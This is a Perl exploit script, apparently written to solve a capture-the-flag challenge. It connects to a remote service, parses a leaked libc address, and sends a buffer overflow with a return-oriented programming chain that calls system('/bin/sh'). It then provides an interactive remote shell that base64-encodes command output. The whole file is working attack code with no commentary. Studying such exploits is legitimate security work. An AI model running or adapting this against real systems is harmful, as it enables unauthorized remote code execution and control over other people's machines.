#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;
use MIME::Base64;

my $valueReadMem = 0x00007fd6734a82e8;
my $returnFromMainMem = 0x00007fd6732db083;

my $returnFromMainFile = 0x24083;
my $popRdiRetFile = 0x23b6a;
my $retFile = 0x23b6b;
my $systemFile = 0x52290;
my $binShFile = 0x1b45bd;
my $exitFile = 0x46a40;

if (@ARGV != 2) {
	die "Usage: comm.pl host port\n";
}

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
die "IO::Socket : $!" unless $sock;
binmode($sock);

my $hello = <$sock>;
print $sock "\n";
my $valueLine = <$sock>;
my $valueTemp = substr($valueLine, 18);
$valueTemp = substr($valueTemp, 0, length($valueTemp) - 2);
my $valueReadActual = unpack("Q", $valueTemp . "\0\0\0\0\0\0\0\0");
my $countryQuery = <$sock>;

my $fileToMemOffset = $valueReadActual - $valueReadMem + $returnFromMainMem - $returnFromMainFile;
my $payload = ("x" x 0x58) . pack("Q*",
	$popRdiRetFile + $fileToMemOffset,
	$binShFile + $fileToMemOffset,
	$retFile + $fileToMemOffset,
	$systemFile + $fileToMemOffset,
	$popRdiRetFile + $fileToMemOffset,
	0,
	$retFile + $fileToMemOffset,
	$exitFile + $fileToMemOffset
) . "\n";

print $sock $payload;

print $sock "echo meow\n";
for (;;) {
	my $line = <$sock>;
	unless ($line) { die "communication error\n"; }
	if (index($line, "meow") >= 0) { last; }
}
print "entering psuedo-interactive mode!\n";
for (;;) {
	my $command = <STDIN>;
	chomp($command);
	if ($command eq "") { next; }
	if ($command eq "exit") { last; }
	print $sock "$command | base64 -w 999999999\n";
	my $res = <$sock>;
	print decode_base64($res);
}

close($sock);
